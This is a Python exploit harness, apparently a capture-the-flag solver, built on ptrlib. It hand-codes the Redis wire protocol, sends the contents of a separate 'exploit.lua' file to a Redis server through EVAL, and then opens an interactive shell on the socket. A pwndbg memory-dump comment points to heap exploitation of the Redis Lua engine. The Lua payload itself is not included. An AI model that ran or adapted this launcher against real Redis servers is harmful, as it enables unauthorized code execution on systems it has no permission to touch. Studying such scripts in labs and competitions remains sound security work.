from ptrlib import *
import string

def R(data):
    if isinstance(data, int):
        return f":{data}\r\n".encode()
    elif isinstance(data, str):
        return f"${len(data)}\r\n{data}\r\n".encode()
    elif isinstance(data, bytes):
        return f"${len(data)}\r\n".encode() + data + b"\r\n"
    elif isinstance(data, list):
        return f"*{len(data)}\r\n".encode() + b''.join([R(elm) for elm in data])
    elif data is None:
        return b"$-1\r\n"
    else:
        raise ValueError(f"Non-RESP type: {type(data)}")

def redis_recv(sock):
    t = sock.recvonce(1)
    if t == b'+' or t == b'-':
        return sock.recvuntil("\r\n")[:-2]
    elif t == b':':
        return int(sock.recvuntil("\r\n")[:-2])
    elif t == b'$':
        s = int(sock.recvuntil("\r\n")[:-2])
        if s == -1:
            return None
        d = sock.recvonce(s)
        sock.recvuntil("\r\n")
        return d
    elif t == b'*':
        s = int(sock.recvuntil("\r\n")[:-2])
        return [redis_recv(sock) for i in range(s)]
    else:
        raise ValueError(f"What is this? {t}")

def redis_comm(sock, argv):
    sock.send(R(argv))
    return redis_recv(sock)

def GET(key):
    return redis_comm(sock, ["GET", key])
def EVAL(script):
    return redis_comm(sock, ["EVAL", script, "0"])

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "6379")

# pwndbg> x/32xg 0x555555a5a000
sock = Socket(HOST, int(PORT))

r = EVAL(open("exploit.lua", "rb").read())
print(r)

sock.sh()
